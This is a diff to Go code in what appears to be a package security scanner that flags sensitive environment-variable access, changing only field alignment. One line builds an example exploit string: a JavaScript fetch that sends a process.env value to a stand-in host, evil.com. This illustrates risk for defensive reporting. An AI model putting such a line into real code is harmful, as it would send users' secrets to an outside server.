@@ -63,10 +63,10 @@ func (a *EnvAnalyzer) scanContent(content, filename string) []Finding {
 		for _, p := range envPatterns {
 			if p.pattern.MatchString(varName) {
 				findings = append(findings, Finding{
-					Analyzer:    a.Name(),
-					Title:       "Sensitive environment variable access",
-					Description: "The package accesses a potentially sensitive environment variable: " + varName + " in " + filename,
-					Severity:    p.severity,
+					Analyzer:       a.Name(),
+					Title:          "Sensitive environment variable access",
+					Description:    "The package accesses a potentially sensitive environment variable: " + varName + " in " + filename,
+					Severity:       p.severity,
 					ExploitExample: fmt.Sprintf("fetch('https://evil.com/leak', { body: process.env.%s });", varName),
 					Remediation:    "Use a dedicated secrets manager or a well-vetted configuration library. Never leak process.env to logs or network requests.",
 				})
